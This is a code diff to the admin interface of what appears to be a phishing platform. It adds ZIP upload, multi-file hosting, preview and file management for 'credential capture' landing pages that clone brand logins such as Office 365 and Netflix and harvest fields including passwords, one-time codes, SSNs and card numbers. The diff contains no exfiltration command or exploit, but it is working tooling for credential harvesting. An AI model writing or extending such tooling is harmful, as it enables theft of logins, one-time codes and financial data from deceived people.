@@ -753,7 +753,7 @@
         const pages = (await api('/api/landing-pages')) || [];
         el.innerHTML = `
             <div class="flex items-center justify-between mb-8">
-                <div><h2 class="text-2xl md:text-3xl font-bold">Landing Pages</h2><p class="text-gray-400 mt-1">Custom credential capture pages — paste any HTML, import any URL, full control</p></div>
+                <div><h2 class="text-2xl md:text-3xl font-bold">Landing Pages</h2><p class="text-gray-400 mt-1">Multi-file support: ZIP upload, CSS/JS/assets, multi-page flows, any credential fields</p></div>
                 <button onclick="showCreateLandingPage()" class="btn-primary px-4 md:px-6 py-2.5 rounded-lg font-medium"><i class="fas fa-plus mr-2"></i>New Page</button>
             </div>
             <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 md:gap-6">
@@ -761,16 +761,21 @@
                     <div class="glass rounded-xl p-6">
                         <div class="flex items-center gap-3 mb-4">
                             <div class="w-10 h-10 rounded-lg bg-green-500/20 flex items-center justify-center"><i class="fas fa-globe text-green-400"></i></div>
-                            <div class="flex-1"><h3 class="font-semibold">${p.name}</h3><p class="text-xs text-gray-400 truncate">${p.url || 'Custom HTML'}</p></div>
+                            <div class="flex-1"><h3 class="font-semibold">${p.name}</h3>
+                                <p class="text-xs text-gray-400">${p.files && p.files.length > 1 ? `<span class="text-blue-400">${p.files.length} files</span>` : (p.url || 'Single HTML')}</p>
+                            </div>
                         </div>
-                        <p class="text-sm text-gray-400 mb-3">Captures: ${(p.capture_fields || []).join(', ')}</p>
+                        <p class="text-sm text-gray-400 mb-2">Captures: <span class="text-white">${(p.capture_fields || []).join(', ')}</span></p>
+                        ${p.files && p.files.length > 1 ? `<p class="text-xs text-gray-500 mb-2">Entry: ${p.root_file}</p>` : ''}
                         ${p.redirect_url ? `<p class="text-xs text-gray-500 mb-3">Redirect: <span class="text-blue-400">${p.redirect_url}</span></p>` : ''}
-                        <div class="flex gap-2">
+                        <div class="flex gap-2 flex-wrap">
                             <button onclick="editLandingPage(${p.id})" class="text-sm px-3 py-1.5 rounded-lg bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"><i class="fas fa-edit mr-1"></i>Edit</button>
-                            <button onclick="deleteLandingPage(${p.id})" class="text-sm px-3 py-1.5 rounded-lg bg-red-500/20 text-red-400 hover:bg-red-500/30"><i class="fas fa-trash mr-1"></i>Delete</button>
+                            <button onclick="manageLandingPageFiles(${p.id})" class="text-sm px-3 py-1.5 rounded-lg bg-purple-500/20 text-purple-400 hover:bg-purple-500/30"><i class="fas fa-folder-open mr-1"></i>Files</button>
+                            <button onclick="previewLandingPage(${p.id})" class="text-sm px-3 py-1.5 rounded-lg bg-green-500/20 text-green-400 hover:bg-green-500/30"><i class="fas fa-eye mr-1"></i>Preview</button>
+                            <button onclick="deleteLandingPage(${p.id})" class="text-sm px-3 py-1.5 rounded-lg bg-red-500/20 text-red-400 hover:bg-red-500/30"><i class="fas fa-trash mr-1"></i></button>
                         </div>
                     </div>`).join('')}
-                ${pages.length === 0 ? '<div class="col-span-3 p-12 text-center text-gray-500"><i class="fas fa-globe text-4xl mb-4"></i><p>No landing pages yet. Create one from scratch, paste HTML, or import any URL.</p></div>' : ''}
+                ${pages.length === 0 ? '<div class="col-span-3 p-12 text-center text-gray-500"><i class="fas fa-globe text-4xl mb-4"></i><p>No landing pages yet. Create one from scratch, upload a ZIP, or import any URL.</p></div>' : ''}
             </div>`;
     }
 
@@ -781,31 +786,141 @@
         showPage('landing-pages');
     }
 
+    async function previewLandingPage(id) {
+        window.open(`/lp/${id}?tracking_id=preview`, '_blank');
+    }
+
+    async function manageLandingPageFiles(id) {
+        const p = await api(`/api/landing-pages/${id}`);
+        const files = (await api(`/api/landing-pages/${id}/files`)) || {files: []};
+        showModal(`Manage Files: ${p.name}`, `
+            <div class="space-y-4">
+                <div class="flex items-center gap-3">
+                    <button onclick="document.getElementById('lp-zip-upload').click()" class="btn-primary px-4 py-2 rounded-lg text-sm font-medium"><i class="fas fa-file-zipper mr-2"></i>Upload ZIP</button>
+                    <button onclick="document.getElementById('lp-single-upload').click()" class="glass px-4 py-2 rounded-lg text-sm font-medium hover:bg-white/10"><i class="fas fa-file mr-2"></i>Add File</button>
+                    <input type="file" id="lp-zip-upload" accept=".zip" style="display:none" onchange="uploadLandingPageZIP(${id}, this)">
+                    <input type="file" id="lp-single-upload" style="display:none" onchange="uploadLandingPageFile(${id}, this)">
+                </div>
+                <div class="glass rounded-lg p-4 max-h-[400px] overflow-y-auto">
+                    <table class="w-full text-sm">
+                        <thead class="text-gray-400 text-left"><tr><th class="pb-2">File</th><th class="pb-2 text-right">Action</th></tr></thead>
+                        <tbody class="divide-y divide-white/5">
+                            ${files.files.map(f => `
+                                <tr class="hover:bg-white/5">
+                                    <td class="py-2 font-mono text-xs">${f}</td>
+                                    <td class="py-2 text-right"><button onclick="deleteLandingPageFile(${id}, '${f}')" class="text-xs text-red-400 hover:text-red-300"><i class="fas fa-trash"></i></button></td>
+                                </tr>
+                            `).join('')}
+                            ${files.files.length === 0 ? '<tr><td colspan="2" class="py-4 text-center text-gray-500">No files. Upload a ZIP containing your landing page (HTML, CSS, JS, images).</td></tr>' : ''}
+                        </tbody>
+                    </table>
+                </div>
+                <div class="text-xs text-gray-500">
+                    <p><strong class="text-white">Entry point:</strong> ${p.root_file || 'index.html'}</p>
+                    <p class="mt-1">Upload a ZIP with your complete landing page. All files will be extracted and served at <code>/lp/${id}/filename</code></p>
+                </div>
+            </div>`, true);
+    }
+
+    async function uploadLandingPageZIP(id, input) {
+        const file = input.files[0];
+        if (!file) return;
+        const formData = new FormData();
+        formData.append('file', file);
+        toast('Uploading ZIP...', 'info');
+        try {
+            const r = await fetch(API + `/api/landing-pages/${id}/upload-zip`, { method: 'POST', body: formData });
+            const result = await r.json();
+            if (result.message) {
+                toast(result.message);
+                manageLandingPageFiles(id);
+            } else {
+                toast('Upload failed', 'error');
+            }
+        } catch(e) {
+            toast('Upload failed: ' + e.message, 'error');
+        }
+        input.value = '';
+    }
+
+    async function uploadLandingPageFile(id, input) {
+        const file = input.files[0];
+        if (!file) return;
+        const formData = new FormData();
+        formData.append('file', file);
+        toast('Uploading file...', 'info');
+        try {
+            const r = await fetch(API + `/api/landing-pages/${id}/upload-file?filename=${encodeURIComponent(file.name)}`, { method: 'POST', body: formData });
+            const result = await r.json();
+            if (result.message) {
+                toast(result.message);
+                manageLandingPageFiles(id);
+            } else {
+                toast('Upload failed', 'error');
+            }
+        } catch(e) {
+            toast('Upload failed: ' + e.message, 'error');
+        }
+        input.value = '';
+    }
+
+    async function deleteLandingPageFile(id, filename) {
+        if (!confirm('Delete ' + filename + '?')) return;
+        await api(`/api/landing-pages/${id}/files/${filename}`, 'DELETE');
+        toast('File deleted');
+        manageLandingPageFiles(id);
+    }
+
     async function showCreateLandingPage() {
         showModal('New Landing Page', `
             <div class="space-y-4">
-                <form onsubmit="createLandingPage(event)" class="space-y-3">
-                    <input id="lp-name" placeholder="Page Name (e.g. Office 365 Login)" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5" required>
-                    <div class="flex gap-2">
-                        <input id="lp-url" placeholder="Import from URL (https://example.com/login)" class="flex-1 bg-white/10 border border-white/20 rounded-lg px-4 py-2.5">
-                        <button type="button" onclick="importLandingPageURL()" class="px-4 py-2.5 rounded-lg bg-blue-500/20 text-blue-400 hover:bg-blue-500/30 font-medium text-sm whitespace-nowrap"><i class="fas fa-download mr-1"></i>Fetch</button>
-                    </div>
-                    <div class="flex items-center justify-between">
-                        <button type="button" onclick="document.getElementById('lp-file').click()" class="text-xs px-2 py-1 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"><i class="fas fa-upload mr-1"></i>Upload HTML File</button>
-                        <input type="file" id="lp-file" accept=".html,.htm,.mhtml" style="display:none" onchange="loadFileToField(this, 'lp-html')">
-                        <span class="text-xs text-gray-500">or paste HTML below</span>
-                    </div>
-                    <textarea id="lp-html" placeholder="Paste your HTML here — or upload an HTML file above" rows="12" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-3 font-mono text-sm"></textarea>
-                    <div id="lp-preview-container" class="hidden">
-                        <label class="text-xs text-gray-400 mb-1 block">Preview</label>
-                        <div class="preview-frame bg-white rounded-lg overflow-hidden min-h-[200px]"><iframe id="lp-preview-frame" class="w-full min-h-[200px] border-none"></iframe></div>
-                    </div>
-                    <div class="grid grid-cols-2 gap-3">
-                        <input id="lp-redirect" placeholder="Redirect URL after submit (optional)" class="bg-white/10 border border-white/20 rounded-lg px-4 py-2.5">
-                        <input id="lp-fields" placeholder="Capture fields (email,password)" class="bg-white/10 border border-white/20 rounded-lg px-4 py-2.5" value="email,password">
-                    </div>
-                    <button type="submit" class="w-full btn-primary py-2.5 rounded-lg font-medium"><i class="fas fa-plus mr-2"></i>Create Landing Page</button>
-                </form>
+                <div class="flex gap-2 border-b border-white/10 pb-2">
+                    <button onclick="showLandingTab('single')" id="tab-single" class="text-sm px-3 py-1 rounded-lg bg-white/10 text-white">Single HTML</button>
+                    <button onclick="showLandingTab('zip')" id="tab-zip" class="text-sm px-3 py-1 rounded-lg text-gray-400 hover:text-white">Upload ZIP</button>
+                </div>
+                <div id="landing-single-tab">
+                    <form onsubmit="createLandingPage(event)" class="space-y-3">
+                        <input id="lp-name" placeholder="Page Name (e.g. Office 365 Login)" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5" required>
+                        <div class="flex gap-2">
+                            <input id="lp-url" placeholder="Import from URL (https://example.com/login)" class="flex-1 bg-white/10 border border-white/20 rounded-lg px-4 py-2.5">
+                            <button type="button" onclick="importLandingPageURL()" class="px-4 py-2.5 rounded-lg bg-blue-500/20 text-blue-400 hover:bg-blue-500/30 font-medium text-sm whitespace-nowrap"><i class="fas fa-download mr-1"></i>Fetch</button>
+                        </div>
+                        <div class="flex items-center justify-between">
+                            <button type="button" onclick="document.getElementById('lp-file').click()" class="text-xs px-2 py-1 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"><i class="fas fa-upload mr-1"></i>Upload HTML File</button>
+                            <input type="file" id="lp-file" accept=".html,.htm,.mhtml" style="display:none" onchange="loadFileToField(this, 'lp-html')">
+                            <span class="text-xs text-gray-500">or paste HTML below</span>
+                        </div>
+                        <textarea id="lp-html" placeholder="Paste your HTML here — or upload an HTML file above" rows="10" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-3 font-mono text-sm"></textarea>
+                        <div id="lp-preview-container" class="hidden">
+                            <label class="text-xs text-gray-400 mb-1 block">Preview</label>
+                            <div class="preview-frame bg-white rounded-lg overflow-hidden min-h-[200px]"><iframe id="lp-preview-frame" class="w-full min-h-[200px] border-none"></iframe></div>
+                        </div>
+                        <div class="grid grid-cols-2 gap-3">
+                            <input id="lp-redirect" placeholder="Redirect URL after submit (optional)" class="bg-white/10 border border-white/20 rounded-lg px-4 py-2.5">
+                            <input id="lp-fields" placeholder="Capture fields (email,password,otp,ssn)" class="bg-white/10 border border-white/20 rounded-lg px-4 py-2.5" value="email,password">
+                        </div>
+                        <button type="submit" class="w-full btn-primary py-2.5 rounded-lg font-medium"><i class="fas fa-plus mr-2"></i>Create Landing Page</button>
+                    </form>
+                </div>
+                <div id="landing-zip-tab" class="hidden">
+                    <form onsubmit="createLandingPageFromZIP(event)" class="space-y-3">
+                        <input id="lp-zip-name" placeholder="Page Name (e.g. Netflix Login)" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5" required>
+                        <div class="flex items-center gap-3">
+                            <button type="button" onclick="document.getElementById('lp-zip-file').click()" class="btn-primary px-4 py-2.5 rounded-lg text-sm"><i class="fas fa-file-zipper mr-2"></i>Select ZIP</button>
+                            <span id="lp-zip-filename" class="text-sm text-gray-400">No file selected</span>
+                            <input type="file" id="lp-zip-file" accept=".zip" style="display:none" onchange="onZIPSelected(this)">
+                        </div>
+                        <div class="grid grid-cols-2 gap-3">
+                            <input id="lp-zip-redirect" placeholder="Redirect URL after submit" class="bg-white/10 border border-white/20 rounded-lg px-4 py-2.5">
+                            <input id="lp-zip-fields" placeholder="Capture fields (email,password,otp)" class="bg-white/10 border border-white/20 rounded-lg px-4 py-2.5" value="email,password">
+                        </div>
+                        <div class="text-xs text-gray-500">
+                            <p><strong class="text-white">ZIP contents:</strong> Include index.html, style.css, script.js, images, etc.</p>
+                            <p class="mt-1">All files will be extracted and served relative to each other. Forms will be auto-injected with tracking.</p>
+                        </div>
+                        <button type="submit" class="w-full btn-primary py-2.5 rounded-lg font-medium"><i class="fas fa-plus mr-2"></i>Upload & Create</button>
+                    </form>
+                </div>
                 <div class="border-t border-white/10 pt-4">
                     <p class="text-sm text-gray-400 mb-3">Or start from a template:</p>
                     <div class="grid grid-cols-2 md:grid-cols-3 gap-2" id="lp-templates-grid"></div>
@@ -826,6 +941,51 @@
                 document.getElementById('lp-preview-container').classList.add('hidden');
             }
         });
+    }
+
+    function showLandingTab(tab) {
+        document.getElementById('landing-single-tab').classList.toggle('hidden', tab !== 'single');
+        document.getElementById('landing-zip-tab').classList.toggle('hidden', tab !== 'zip');
+        document.getElementById('tab-single').className = tab === 'single' ? 'text-sm px-3 py-1 rounded-lg bg-white/10 text-white' : 'text-sm px-3 py-1 rounded-lg text-gray-400 hover:text-white';
+        document.getElementById('tab-zip').className = tab === 'zip' ? 'text-sm px-3 py-1 rounded-lg bg-white/10 text-white' : 'text-sm px-3 py-1 rounded-lg text-gray-400 hover:text-white';
+    }
+
+    function onZIPSelected(input) {
+        const file = input.files[0];
+        document.getElementById('lp-zip-filename').textContent = file ? file.name : 'No file selected';
+    }
+
+    async function createLandingPageFromZIP(e) {
+        e.preventDefault();
+        const file = document.getElementById('lp-zip-file').files[0];
+        if (!file) { toast('Select a ZIP file first', 'error'); return; }
+        
+        // First create empty landing page
+        const fields = document.getElementById('lp-zip-fields').value.split(',').map(f => f.trim()).filter(f => f);
+        const page = await api('/api/landing-pages', 'POST', {
+            name: document.getElementById('lp-zip-name').value,
+            capture_fields: fields,
+            redirect_url: document.getElementById('lp-zip-redirect').value,
+        });
+        if (!page.id) { toast('Failed to create landing page', 'error'); return; }
+        
+        // Upload ZIP
+        const formData = new FormData();
+        formData.append('file', file);
+        toast('Uploading ZIP...', 'info');
+        try {
+            const r = await fetch(API + `/api/landing-pages/${page.id}/upload-zip`, { method: 'POST', body: formData });
+            const result = await r.json();
+            if (result.message) {
+                toast('Landing page created with ' + result.files.length + ' files!');
+                document.getElementById('modal').remove();
+                showPage('landing-pages');
+            } else {
+                toast('ZIP upload failed', 'error');
+            }
+        } catch(e) {
+            toast('Upload failed: ' + e.message, 'error');
+        }
     }
 
     async function importLandingPageURL() {
@@ -884,48 +1044,59 @@
 
     async function editLandingPage(id) {
         const p = await api(`/api/landing-pages/${id}`);
+        const isMultiFile = p.files && p.files.length > 1;
         showModal('Edit Landing Page', `
             <form onsubmit="updateLandingPage(event, ${id})" class="space-y-3">
                 <input id="lp-edit-name" value="${p.name}" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5" required>
                 <input id="lp-edit-url" value="${p.url || ''}" placeholder="Source URL" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-2.5">
-                <div class="flex items-center justify-between">
-                    <button type="button" onclick="document.getElementById('lp-edit-file').click()" class="text-xs px-2 py-1 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"><i class="fas fa-upload mr-1"></i>Upload HTML File</button>
-                    <input type="file" id="lp-edit-file" accept=".html,.htm,.mhtml" style="display:none" onchange="loadFileToField(this, 'lp-edit-html')">
-                </div>
-                <textarea id="lp-edit-html" rows="14" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-3 font-mono text-sm">${p.html_content || ''}</textarea>
-                <div id="lp-edit-preview-container" class="${p.html_content ? '' : 'hidden'}">
-                    <div class="preview-frame bg-white rounded-lg overflow-hidden min-h-[200px]"><iframe id="lp-edit-preview-frame" class="w-full min-h-[200px] border-none" srcdoc="${(p.html_content || '').replace(/"/g, '&quot;')}"></iframe></div>
-                </div>
+                ${isMultiFile ? `
+                    <div class="p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
+                        <p class="text-xs text-blue-400"><i class="fas fa-info-circle mr-1"></i> This is a multi-file landing page (${p.files.length} files). Edit files via the <strong>Files</strong> button on the card.</p>
+                    </div>
+                ` : `
+                    <div class="flex items-center justify-between">
+                        <button type="button" onclick="document.getElementById('lp-edit-file').click()" class="text-xs px-2 py-1 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"><i class="fas fa-upload mr-1"></i>Upload HTML File</button>
+                        <input type="file" id="lp-edit-file" accept=".html,.htm,.mhtml" style="display:none" onchange="loadFileToField(this, 'lp-edit-html')">
+                    </div>
+                    <textarea id="lp-edit-html" rows="10" class="w-full bg-white/10 border border-white/20 rounded-lg px-4 py-3 font-mono text-sm">${p.html_content || ''}</textarea>
+                    <div id="lp-edit-preview-container" class="${p.html_content ? '' : 'hidden'}">
+                        <div class="preview-frame bg-white rounded-lg overflow-hidden min-h-[200px]"><iframe id="lp-edit-preview-frame" class="w-full min-h-[200px] border-none" srcdoc="${(p.html_content || '').replace(/"/g, '&quot;')}"></iframe></div>
+                    </div>
+                `}
                 <div class="grid grid-cols-2 gap-3">
                     <input id="lp-edit-redirect" value="${p.redirect_url || ''}" placeholder="Redirect URL after submit" class="bg-white/10 border border-white/20 rounded-lg px-4 py-2.5">
-                    <input id="lp-edit-fields" value="${(p.capture_fields || []).join(',')}" placeholder="Capture fields" class="bg-white/10 border border-white/20 rounded-lg px-4 py-2.5">
+                    <input id="lp-edit-fields" value="${(p.capture_fields || []).join(',')}" placeholder="Capture fields (email,password,otp,ssn,card)" class="bg-white/10 border border-white/20 rounded-lg px-4 py-2.5">
                 </div>
                 <div class="flex gap-2">
                     <button type="submit" class="flex-1 btn-primary py-2.5 rounded-lg font-medium">Update</button>
                     <button type="button" onclick="deleteLandingPage(${id})" class="px-4 py-2.5 rounded-lg bg-red-500/20 text-red-400 hover:bg-red-500/30 font-medium">Delete</button>
                 </div>
             </form>`, true);
-        document.getElementById('lp-edit-html').addEventListener('input', () => {
-            const html = document.getElementById('lp-edit-html').value;
-            if (html.trim()) {
-                document.getElementById('lp-edit-preview-container').classList.remove('hidden');
-                document.getElementById('lp-edit-preview-frame').srcdoc = html;
-            } else {
-                document.getElementById('lp-edit-preview-container').classList.add('hidden');
-            }
-        });
+        if (!isMultiFile) {
+            document.getElementById('lp-edit-html').addEventListener('input', () => {
+                const html = document.getElementById('lp-edit-html').value;
+                if (html.trim()) {
+                    document.getElementById('lp-edit-preview-container').classList.remove('hidden');
+                    document.getElementById('lp-edit-preview-frame').srcdoc = html;
+                } else {
+                    document.getElementById('lp-edit-preview-container').classList.add('hidden');
+                }
+            });
+        }
     }
 
     async function updateLandingPage(e, id) {
         e.preventDefault();
         const fields = document.getElementById('lp-edit-fields').value.split(',').map(f => f.trim()).filter(f => f);
-        await api(`/api/landing-pages/${id}`, 'PUT', {
+        const payload = {
             name: document.getElementById('lp-edit-name').value,
             url: document.getElementById('lp-edit-url').value,
-            html_content: document.getElementById('lp-edit-html').value,
             redirect_url: document.getElementById('lp-edit-redirect').value,
             capture_fields: fields,
-        });
+        };
+        const htmlEl = document.getElementById('lp-edit-html');
+        if (htmlEl) payload.html_content = htmlEl.value;
+        await api(`/api/landing-pages/${id}`, 'PUT', payload);
         document.getElementById('modal').remove();
         toast('Landing page updated!');
         showPage('landing-pages');
